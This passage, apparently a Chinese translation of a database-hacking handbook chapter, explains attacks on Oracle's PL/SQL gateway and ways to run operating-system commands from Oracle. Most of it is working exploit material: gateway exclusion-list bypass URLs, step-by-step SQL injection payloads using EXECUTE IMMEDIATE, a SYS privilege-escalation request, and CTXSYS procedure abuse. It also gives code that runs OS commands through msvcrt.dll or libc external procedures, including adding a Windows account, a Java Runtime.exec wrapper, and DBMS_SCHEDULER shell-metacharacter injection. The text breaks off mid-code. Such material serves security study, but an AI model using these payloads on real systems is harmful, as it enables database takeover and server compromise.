<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/%0Aowa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure>

<p>Oracle 对此进行了修补，但下一个修补程序也可能会失败。 这次的问题是由于后端数据库服务器将十六进制字节 0xFF 视为 Y，而网关没有。 因此，通过请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/S%FFS.owa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure>

<p>攻击者可以再次访问包 - %FF 被数据库转换为 Y，使模式名称为 SYS。 此问题是由国际化功能引起的。可以通过将模式名称括在双引号中来解决此问题的补丁：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/&quot; SYS&quot;.owa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure>

<p>这打破了模式匹配。 但是，这在 10g 应用程序服务器上不起作用，因为此版本的 PL/SQL 网关将所有大写字符转换为小写字符，将“SYS”请求为“sys”。 因此，Oracle 将无法找到包，因为带引号的标识符区分大小写。 但是，可以通过在包名称前插入 goto 标签来破坏 10g 应用程序服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/&lt;&lt;LBL&gt;&gt;owa_util.cellsprint?p_thequery=select+1+from+dual</span><br></pre></td></tr></table></figure>

<p>可以通过在各个区域插入任意 SQL 元素来破坏下一个补丁。如果用户请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/FOO.BAR</span><br></pre></td></tr></table></figure>

<p>执行以下 PL/SQL：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">1 declare</span><br><span class="line">2  rc__ number;</span><br><span class="line">3  start_time__ binary_integer;</span><br><span class="line">4  simple_list__ owa_util.vc_arr;</span><br><span class="line">5  complex_list__ owa_util.vc_arr;</span><br><span class="line">6 begin</span><br><span class="line">7  start_time__ := dbms_utility.get_time;</span><br><span class="line">8  owa.init_cgi_env(:n__,:nm__,:v__);</span><br><span class="line">9  htp.HTBUF_LEN := 255;</span><br><span class="line">10  null;</span><br><span class="line">11  null;</span><br><span class="line">12  simple_list__(1) := &#x27;sys.%&#x27;;</span><br><span class="line"></span><br><span class="line">13  simple_list__(2) := &#x27;dbms\_%&#x27;;</span><br><span class="line">14  simple_list__(3) := &#x27;utl\_%&#x27;;</span><br><span class="line">15  simple_list__(4) := &#x27;owa\_%&#x27;;</span><br><span class="line">16  simple_list__(5) := &#x27;owa.%&#x27;;</span><br><span class="line">17  simple_list__(6) := &#x27;htp.%&#x27;;</span><br><span class="line">18  simple_list__(7) := &#x27;htf.%&#x27;;</span><br><span class="line">19  if ((owa_match.match_pattern(&#x27;foo.bar&#x27;, simple_list__,</span><br><span class="line">complex_list__,</span><br><span class="line">true))) then</span><br><span class="line">20   rc__ := 2;</span><br><span class="line">21  else</span><br><span class="line">22   null;</span><br><span class="line">23   orasso.wpg_session.init();</span><br><span class="line">24   foo.bar;</span><br><span class="line">25   if (wpg_docload.is_file_download) then</span><br><span class="line">26    rc__ := 1;</span><br><span class="line">27    wpg_docload.get_download_file(:doc_info);</span><br><span class="line">28    orasso.wpg_session.deinit();</span><br><span class="line">29    null;</span><br><span class="line">30    null;</span><br><span class="line">31    commit;</span><br><span class="line">32   else</span><br><span class="line">33    rc__ := 0;</span><br><span class="line">34    orasso.wpg_session.deinit();</span><br><span class="line">35    null;</span><br><span class="line">36    null;</span><br><span class="line">37    commit;</span><br><span class="line">38    owa.get_page(:data__,:ndata__);</span><br><span class="line">39   end if;</span><br><span class="line">40  end if;</span><br><span class="line">41  :rc__ := rc__;</span><br><span class="line">42  :db_proc_time__ := dbms_utility.get_time - start_time__;</span><br><span class="line">43 end;</span><br></pre></td></tr></table></figure>

<p>请注意，在第 19 行，根据可能源自攻击的已知“坏”值列表对请求的包和过程名称 FOO.BAR 进行检查。 除了检查简单列表中的字符串外，它还检查特殊字符。</p>
<p>如果用户然后请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/INJECT&#x27;POINT</span><br></pre></td></tr></table></figure>

<p>执行以下 PL/SQL：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line">18  simple_list__(7) := &#x27;htf.%&#x27;;</span><br><span class="line">19  if ((owa_match.match_pattern(&#x27;inject&#x27;point&#x27;, simple_list__,</span><br><span class="line">complex_list__, true))) then</span><br><span class="line">20   rc__ := 2;</span><br><span class="line">21  else</span><br><span class="line"></span><br><span class="line">22   null;</span><br><span class="line">23   orasso.wpg_session.init();</span><br><span class="line">24   inject&#x27;point;</span><br><span class="line">..</span><br></pre></td></tr></table></figure>

<p>错误日志中生成错误：“PLS-00103：在期望以下其中一项时遇到符号‘POINT’……”这是由于 SQL 注入问题。 为了破坏服务器，攻击者只需要构建和注入特定的查询。有一些障碍需要克服。 首先，它们被限制为由句点分隔的三个 30 个字符的块 - 如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.BBBBBBBBBBBBBBBBBBBBBBBBBBBBBB.CCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br></pre></td></tr></table></figure>

<p>其次，它们注入的任何内容也都可以在第 24 行找到 - 由于它们必须用单引号引起来，因此该行上的 SQL 将不平衡。 他们可以通过将注入字符串的前两个字节设为双减来解决此问题。如果他们现在要求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;</span><br><span class="line"></span><br><span class="line">if ((owa_match.match_pattern(&#x27;--&#x27;&#x27;, simple_list__, complex_list__,</span><br><span class="line">true))) then</span><br></pre></td></tr></table></figure>

<p>现在需要闭合括号：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;)))</span><br></pre></td></tr></table></figure>

<p>第19行代码变为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((owa_match.match_pattern(&#x27;--&#x27;)))&#x27;, simple_list__,</span><br><span class="line">complex_list__,true))) then</span><br></pre></td></tr></table></figure>

<p>第24行为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x27;)));</span><br></pre></td></tr></table></figure>

<p>完成后，他们用 THEN 结束 IF：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;)))%20then%20rc__:%3D2</span><br></pre></td></tr></table></figure>

<p>第19行代码变为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((owa_match.match_pattern(&#x27;--&#x27;))) then rc__:=2&#x27;, simple_list__,</span><br><span class="line">complex_list__, true))) then</span><br></pre></td></tr></table></figure>

<p>第24行为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--&#x27;))) then rc__:=2;</span><br></pre></td></tr></table></figure>

<p>现在可以用分号和另一个双减号结束：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;)))%20then%20rc__:%3D2;--</span><br></pre></td></tr></table></figure>

<p>第19行代码变为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if ((owa_match.match_pattern(&#x27;--&#x27;))) then rc__:=2;--&#x27;,</span><br><span class="line">simple_list__,complex_list__, true))) then</span><br></pre></td></tr></table></figure>

<p>第24行为 </p>
<p>–’))) then rc__:=2;–;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;)))</span><br></pre></td></tr></table></figure>

<p>这将返回一个“403 Forbidden”响应——这正是现阶段所期望的。 它返回禁止，因为 OWA_MATCH 将返回 true，因为注入字符串以双减号开头。 然而，这无关紧要，因为攻击者可以在最后一个分号和最后一个双减号之间注入一个过程，确保他们以分号结束他们的注入过程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/--&#x27;)))%20then%20rc__:%3D2;XXXXXXXX;--</span><br></pre></td></tr></table></figure>

<p>通过在 XXXXXXXX 所在的位置放置任意 SQL，攻击者可以使其执行。 由于前面提到的限制，攻击可能被证明是困难的（但并非不可能），并且存在一种更简单的方法。</p>
<p>首先，攻击者需要找到一个不带参数的PL/SQL过程，如下例所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JAVA_AUTONOMOUS_TRANSACTION.PUSH</span><br><span class="line">XMLGEN.USELOWERCASETAGNAMES</span><br><span class="line">PORTAL.WWV_HTP.CENTERCLOSE</span><br><span class="line">ORASSO.HOME</span><br><span class="line">WWC_VERSION.GET_HTTP_DATABASE_INFO</span><br></pre></td></tr></table></figure>

<p>如果攻击者发送</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?FOO=BAR</span><br></pre></td></tr></table></figure>

<p>服务器应该返回“404 File Not Found”响应，因为 orasso.home 过程不需要参数并且已经提供了参数。 但是，在返回404之前，执行了以下PL/SQL：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">..</span><br><span class="line">..</span><br><span class="line">if ((owa_match.match_pattern(&#x27;orasso.home&#x27;, simple_list__,</span><br><span class="line">complex_list__,</span><br><span class="line">true))) then</span><br><span class="line"> rc__ := 2;</span><br><span class="line">else</span><br><span class="line"> null;</span><br><span class="line"> orasso.wpg_session.init();</span><br><span class="line"> orasso.home(FOO=&gt;:FOO);</span><br><span class="line">..</span><br><span class="line">..</span><br></pre></td></tr></table></figure>

<p>请注意攻击者的查询字符串中是否存在 FOO。 他们可以滥用它来运行任意 SQL。 首先，他们需要关闭括号：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);--=BAR</span><br></pre></td></tr></table></figure>

<p>这将导致执行以下 PL/SQL：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orasso.home();--=&gt;:);--);</span><br></pre></td></tr></table></figure>

<p>请注意，双减号 (–) 之后的所有内容都被视为注释。</p>
<p>此请求将导致内部服务器错误，因为不再使用绑定变量之一，因此攻击者需要将其添加回来。 碰巧，正是这个绑定变量是运行任意 PL/SQL 的关键。</p>
<p>目前，他们可以使用 HTP.PRINT 打印 BAR，并将所需的绑定变量添加为：1：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);HTP.PRINT(:1);--=BAR</span><br></pre></td></tr></table></figure>

<p>这应该在 HTML 中返回一个带有“BAR”字样的 200。 这里发生的事情是等号之后的所有内容（在本例中为 BAR）都是插入到绑定变量中的数据。</p>
<p>使用相同的技术还可以再次访问 owa_util：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);OWA_UTIL.CELLSPRINT(:1);--=SELECT+USERNAME+FROM+ALL_USERS</span><br></pre></td></tr></table></figure>

<p>为了执行任意 SQL，包括 DML 和 DDL 语句，攻击者插入立即执行：1：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1;--=select%201%20from%20dual</span><br></pre></td></tr></table></figure>

<p>请注意，不会显示输出。 这可以用来利用 SYS 拥有的任何 PL/SQL 注入错误，从而使攻击者能够完全控制后端数据库服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/orasso.home?);execute%20immediate%20:1</span><br><span class="line">;--=DECLARE%20BUF%20VARCHAR2(2000);%20BEGIN%20</span><br><span class="line">BUF:=SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES</span><br><span class="line">(&#x27;INDEX_NAME&#x27;,&#x27;INDEX_SCHEMA&#x27;,&#x27;DBMS_OUTPUT.PUT_LINE(:p1);</span><br><span class="line">EXECUTE%20IMMEDIATE%20&#x27;&#x27;CREATE%20OR%20REPLACE%20PUBLIC%20SYNONYM%20BREAK</span><br><span class="line">ABLE%20FOR%20SYS.BREAKABLE&#x27;&#x27;;END;--&#x27;,&#x27;SYS&#x27;,1,&#x27;VER&#x27;,0);END;</span><br></pre></td></tr></table></figure>

<p>截至 2005 年 11 月 25 日，此漏洞仍未修补且可利用。 假设这将在下一个重要补丁更新中修补：</p>
<ul>
<li><a target="_blank" rel="external nofollow noopener noreferrer" href="http://www.oracle.com/technology/deploy/security/alerts.htm">http://www.oracle.com/technology/deploy/security/alerts.htm</a> </li>
</ul>
<p>当然，可能没有必要绕过 PL/SQL 排除列表。 例如，在 Oracle 9x 数据库服务器中，CTXSYS 用户是 DBA，CTXSYS 拥有的许多 PL/SQL 包都容易受到 SQL 注入的影响——例如 DRILOAD 包。 这个包有一个过程——即 VALIDATE_STMT——它基本上接受用户提供的查询并执行它。 这可能会在网络上被滥用。 这里要注意的一件事是非选择 SQL 请求可能看起来不起作用。 这是因为当您调用 VALIDATE_STMT 过程时，如果您没有进行选择，该过程将返回以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ERROR at line 1:</span><br><span class="line">ORA-06510: PL/SQL: unhandled user-defined exception</span><br><span class="line">ORA-06512: at &quot;CTXSYS.DRILOAD&quot;, line 42</span><br><span class="line">ORA-01003: no statement parsed</span><br><span class="line">ORA-06512: at line 1</span><br></pre></td></tr></table></figure>

<p>这将发送回 Web 服务器，因此 Web 服务器返回“404 文件未找到”响应。 测试是否可以获得访问权限，请求</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/CTXSYS.DRILOAD.VALIDATE_STMT?SQLSTMT=SELECT+1+FROM+DUAL</span><br></pre></td></tr></table></figure>

<p>应该返回一个带有 200 响应的空 HTML 页面。 如果是这样，那么以下内容也应该有效：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=CREATE+OR+REPLACE+PROCEDURE+WEBTEST+AS+BEGIN+HTP.PRINT(&#x27;hello&#x27;);+END;</span><br></pre></td></tr></table></figure>

<p>这应该返回 404，但它会在 CTXSYS 模式中创建一个名为 WEBTEST 的包。</p>
<p>请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad/ctxsys.driload.validate_stmt?sqlstmt=GRANT+EXECUTE+ON+WEBTEST+TO+PUBLIC</span><br></pre></td></tr></table></figure>

<p>授予 PUBLIC 对 WEBTEST 过程的执行权限，并请求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://server.example.com/pls/dad//ctxsys.webtest</span><br></pre></td></tr></table></figure>

<p>返回“Hello”。 这里发生了什么？ 我们的第一个请求创建了一个名为 WEBTEST 的过程，它使用 HTP.PRINT 写出“hello”。 此过程由 CTXSYS 创建并拥有。 第二个请求授予 PUBLIC 对 WEBTEST 过程的执行权限。 最后，我们可以称之为——最后一个请求。 从中可以看出整个攻击和漏洞的危险程度。</p>
<h2 id="执行操作系统命令"><a href="#执行操作系统命令" class="headerlink" title="执行操作系统命令"></a>执行操作系统命令</h2><p>Oracle 提供了许多用于从数据库服务器运行操作系统命令的工具——有些是故意的，有些是“黑客”。 命令可以通过 PL/SQL、Java 和默认包执行，并通过使用 ALTER SYSTEM 命令操作服务器参数来执行。 不用说，运行操作系统命令需要相关的高级权限，但前面的章节已经表明，获得这样的权限并不是一件困难的事。</p>
<h3 id="通过PL-SQL运行系统命令"><a href="#通过PL-SQL运行系统命令" class="headerlink" title="通过PL/SQL运行系统命令"></a>通过PL/SQL运行系统命令</h3><p>开发人员可以通过创建一个共享对象（动态链接库， DLL）来扩展 PL/SQL，该对象在函数中包含他们想要实现的代码。 开发人员将使用 CREATE LIBRARY 语句向 Oracle 服务器注册该库。 一旦注册，就可以调用该函数。 攻击者可以利用这种行为来运行操作系统命令。 他们会通过在 Unix 系统上注册 libc 或在 Windows 系统上注册 msvcrt.dll 然后调用 system() 函数来做到这一点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/ * First register msvcrt.dll/libc */</span><br><span class="line">CREATE OR REPLACE LIBRARY exec_shell AS &#x27;C:\winnt\system32\msvcrt.dll&#x27;;</span><br><span class="line"></span><br><span class="line">/</span><br><span class="line">/* Now create the procedure */</span><br><span class="line">CREATE OR REPLACE PROCEDURE oraexec (cmdstring IN CHAR)</span><br><span class="line">IS EXTERNAL</span><br><span class="line">NAME &quot;system&quot;</span><br><span class="line">LIBRARY exec_shell</span><br><span class="line">LANGUAGE C;</span><br><span class="line">/</span><br><span class="line">/* Once created now run commands */</span><br><span class="line">EXEC ORAEXEC(&#x27;NET USER MYACCOUNT PASSWORD /ADD&#x27;);</span><br></pre></td></tr></table></figure>

<p>当执行ORAEXEC 过程时，Oracle 连接到TNS Listener 并请求访问EXTPROC。 EXTPROC 是 Oracle 用于运行外部过程的程序。侦听器执行 EXTPROC，然后将命名管道上的连接传递给数据库服务器。然后，数据库服务器指示 EXTPROC 加载 msvcrt.dll 库并执行 system() 函数，将命令“NET USER MYACCOUNT PASSWORD /ADD”传递给它。这告诉操作系统添加一个名为 MYACCOUNT 的新用户。因为默认情况下 Oracle 在 Windows 上作为 LOCAL SYSTEM 运行，所以执行起来应该没有任何问题。然后，攻击者当然可以将 MYACCOUNT 添加到本地管理员组。 Oracle 的许多安全安装将禁用外部程序；对于那些需要启用外部程序的程序，它们已被配置为以低权限用户身份运行。</p>
<p>更高版本的 Oracle 将外部库的位置限制在 ORACLE_HOME\bin 目录中。然而，这可以通过使用目录遍历攻击来绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE LIBRARY exec_shell AS</span><br><span class="line">&#x27;$ORACLE_HOME\bin\..\..\..\..\..\winnt\system32\msvcrt.dll&#x27;;</span><br><span class="line"></span><br><span class="line">/</span><br></pre></td></tr></table></figure>

<p>Oracle 已经修复了这个缺陷，因此有两种使用 PL/SQL 执行 OS 命令的方法。 首先，可以使用 UTL_FILE 包（参见第 11 章“访问文件系统”）将 DLL 放入 ORACLE_HOME/bin 目录，或者设置 EXTPROC_DLLS 环境变量。 在无法运行 OS 命令的情况下，第二种方法更难在 Oracle 内部执行，因此首选前一种方法。</p>
<h3 id="通过Java运行操作系统命令"><a href="#通过Java运行操作系统命令" class="headerlink" title="通过Java运行操作系统命令"></a>通过Java运行操作系统命令</h3><p>通过 Java 运行 OS 命令不依赖于外部过程，命令以 Oracle 用户的权限执行。 一旦创建了 Java 源代码，它就会被包装在一个 PL/SQL 过程中，然后可以执行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED &quot;JAVACMD&quot; AS</span><br><span class="line">import java.lang.*;</span><br><span class="line">import java.io.*;</span><br><span class="line"></span><br><span class="line">public class JAVACMD</span><br><span class="line">&#123;</span><br><span class="line"> public static void execCommand (String command) throws IOException</span><br><span class="line"> &#123;</span><br><span class="line">     Runtime.getRuntime().exec(command);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">CREATE OR REPLACE PROCEDURE JAVACMDPROC (p_command IN VARCHAR2)</span><br><span class="line">AS LANGUAGE JAVA</span><br><span class="line">NAME &#x27;JAVACMD.execCommand (java.lang.String)&#x27;;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">exec javacmdproc(&#x27;cmd.exe /c dir &gt; c:\orajava.txt&#x27;);</span><br></pre></td></tr></table></figure>

<p>执行 OS 命令所需的 Java 权限如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec dbms_java.grant_permission(  &#x27;SCOTT&#x27;, &#x27;SYS:java.io.FilePermission&#x27;,&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;,&#x27;execute&#x27;);</span><br><span class="line">exec dbms_java.grant_permission(  &#x27;SCOTT&#x27;,&#x27;SYS:java.lang.RuntimePermission&#x27;, &#x27;writeFileDescriptor&#x27;, &#x27;&#x27;);</span><br><span class="line">exec dbms_java.grant_permission(  &#x27;SCOTT&#x27;,&#x27;SYS:java.lang.RuntimePermission&#x27;, &#x27;readFileDescriptor&#x27;, &#x27;&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="通过DBMS-SCHEDULER运行系统命令"><a href="#通过DBMS-SCHEDULER运行系统命令" class="headerlink" title="通过DBMS_SCHEDULER运行系统命令"></a>通过DBMS_SCHEDULER运行系统命令</h3><p>DBMS_SCHEDULER 是 Oracle 10g 中引入并附带的 PL/SQL 包。 创建此包的目的是使 DBA 能够将预定义的包和 shell 脚本（例如 Windows 批处理文件和 Unix sh 文件）的执行安排为“作业”。 使用 DBMS_SCHEDULER 成功提交作业需要 CREATE JOB 权限。 不允许执行程序。 但是，存在一个允许绕过此限制的错误。 通过在要运行的程序的名称中嵌入诸如与号 (&amp;) 或管道 (∥) 之类的 shell 元字符，可以执行程序：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">DBMS_SCHEDULER.CREATE_PROGRAM (</span><br><span class="line">program_name=&gt; &#x27;MyCmd&#x27;,</span><br><span class="line">program_type=&gt; &#x27;EXECUTABLE&#x27;,</span><br><span class="line">-- Use the ampersand to break out</span><br><span class="line">program_action =&gt;</span><br><span class="line">&#x27;c:/foo.bat&#x27;||chr(38)||&#x27;dir&gt;c:/oraoutput.txt&#x27;||chr(38)||&#x27;c:/foo.bat&#x27;,</span><br><span class="line">enabled=&gt; TRUE,</span><br><span class="line">comments=&gt; &#x27;Run a command using shell metacharacters.&#x27;</span><br><span class="line"> );</span><br><span class="line">END;</span><br><span class="line">/</span><br><span class="line"></span><br><span class="line">BEGIN</span><br><span class="line">DBMS_SCHEDULER.CREATE_JOB (</span><br><span class="line">   job_name=&gt; &#x27;X&#x27;,</span><br><span class="line">   program_name=&gt; &#x27;MyCmd&#x27;,</span><br><span class="line">   repeat_interval=&gt; &#x27;FREQ=SECONDLY;INTERVAL=10&#x27;,</span><br><span class="line">   enabled=&gt; TRUE,</span><br><span class="line">   comments=&gt; &#x27;Every 10 seconds&#x27;);</span><br><span class="line">END;</span><br><span class="line">/</span><br></pre></td></tr></table></figure>

<p>如果要通过 DBMS_SCHEDULER 运行 OS 命令，则必须运行 OracleJobSchedulerSID 服务。 如果没有，则调度程序将生成错误。</p>
<h3 id="通过Job-Scheduler运行系统命令"><a href="#通过Job-Scheduler运行系统命令" class="headerlink" title="通过Job Scheduler运行系统命令"></a>通过Job Scheduler运行系统命令</h3><p>作业调度程序作为外部进程实现 - extjob。 在 Windows 上，它以 LOCAL SYSTEM 操作系统帐户的权限运行。 它侦听名为“orcljsex<sid>”的命名管道，其中 SID 是数据库系统标识符。 当 Job Scheduler 在这个命名管道上接收到一个命令时，它只是尝试执行它。 因此，任何可以连接到命名管道的人，无论是在本地还是使用 SMB 跨网络，都可以作为 LOCAL SYSTEM 运行命令并完全破坏服务器：</sid></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 